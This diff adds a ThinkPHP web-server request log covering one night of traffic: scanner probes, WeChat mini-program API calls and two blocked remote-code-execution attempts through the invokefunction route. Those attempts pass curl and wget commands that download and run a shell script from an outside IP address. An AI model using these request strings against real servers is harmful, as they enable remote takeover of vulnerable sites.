@@ -1,0 +1,3449 @@
+---------------------------------------------------------------
+[ 2023-02-12T00:10:56+08:00 ] 172.17.142.12 141.98.10.56 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.020126s][吞吐率：49.69req/s] [内存消耗：1,719.66kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T01:27:24+08:00 ] 172.17.142.12 47.92.36.178 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.020503s][吞吐率：48.77req/s] [内存消耗：1,720.22kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'accept-encoding' => 'gzip, x-gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T01:27:24+08:00 ] 172.17.142.12 47.92.36.178 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.019304s][吞吐率：51.80req/s] [内存消耗：1,720.13kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=e2jtqf9lmi4b4jmmu0ggt5svl1',
+  'user-agent' => 'Apache-HttpClient/5.1.3 (Java/1.8.0_342)',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'accept-encoding' => 'gzip, x-gzip, deflate',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T02:22:25+08:00 ] 172.17.142.12 106.75.14.46 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.026339s][吞吐率：37.97req/s] [内存消耗：1,720.22kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T03:00:54+08:00 ] 172.17.142.12 109.237.97.141 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh [运行时间：0.025097s][吞吐率：39.85req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'curl 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T03:00:58+08:00 ] 172.17.142.12 109.237.97.141 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20194.40.243.205/t.sh|sh [运行时间：0.031953s][吞吐率：31.30req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'wget -q -O - 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T03:04:28+08:00 ] 172.17.142.12 141.98.11.39 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.022425s][吞吐率：44.59req/s] [内存消耗：1,719.67kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T03:09:13+08:00 ] 172.17.142.12 47.105.96.181 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.018730s][吞吐率：53.39req/s] [内存消耗：1,719.80kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'requests/2.0.0',
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T03:23:00+08:00 ] 172.17.142.12 162.142.125.220 GET /
+[ info ] 39.106.3.107/ [运行时间：0.017661s][吞吐率：56.62req/s] [内存消耗：1,720.14kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T04:19:57+08:00 ] 172.17.142.12 101.133.161.22 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.019896s][吞吐率：50.26req/s] [内存消耗：1,720.57kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
+  'accept-encoding' => 'identity',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T04:23:48+08:00 ] 172.17.142.12 141.98.11.39 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.027935s][吞吐率：35.80req/s] [内存消耗：1,719.67kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T05:09:20+08:00 ] 172.17.142.12 141.98.10.56 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.019073s][吞吐率：52.43req/s] [内存消耗：1,719.67kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T05:25:35+08:00 ] 172.17.142.12 27.187.73.1 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.069190s][吞吐率：14.45req/s] [内存消耗：2,175.23kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; PFGM00 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/6415 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2643,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T05:25:35+08:00 ] 172.17.142.12 27.187.73.1 POST /index.php/handle/Wifi/wxapplist
+[ info ] www.jiajiazxgg.com/index.php/handle/Wifi/wxapplist [运行时间：0.068008s][吞吐率：14.70req/s] [内存消耗：2,448.63kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Wifi',
+    2 => 'wxapplist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; PFGM00 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/6415 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '2',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wxapplist[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T05:26:17+08:00 ] 172.17.142.12 27.187.73.1 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.029061s][吞吐率：34.41req/s] [内存消耗：2,175.23kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; PFGM00 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/6415 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2643,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T05:26:28+08:00 ] 172.17.142.12 27.187.73.1 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.027701s][吞吐率：36.10req/s] [内存消耗：2,175.23kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; PFGM00 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/6415 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2643,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T06:13:12+08:00 ] 172.17.142.12 141.98.10.56 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.019187s][吞吐率：52.12req/s] [内存消耗：1,719.67kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T06:13:48+08:00 ] 172.17.142.12 47.105.96.181 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.019352s][吞吐率：51.67req/s] [内存消耗：1,719.80kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'requests/2.0.0',
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:16:05+08:00 ] 172.17.142.12 27.187.72.62 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.051637s][吞吐率：19.37req/s] [内存消耗：2,175.21kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1734 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2640,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:16:05+08:00 ] 172.17.142.12 27.187.72.62 POST /index.php/handle/Wifi/wxapplist
+[ info ] www.jiajiazxgg.com/index.php/handle/Wifi/wxapplist [运行时间：0.040250s][吞吐率：24.84req/s] [内存消耗：2,448.63kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Wifi',
+    2 => 'wxapplist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1734 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '2',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wxapplist[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:17:13+08:00 ] 172.17.142.12 39.103.133.249 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.018348s][吞吐率：54.50req/s] [内存消耗：1,720.22kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'accept-encoding' => 'gzip, x-gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:17:16+08:00 ] 172.17.142.12 39.103.133.249 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.019960s][吞吐率：50.10req/s] [内存消耗：1,720.13kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
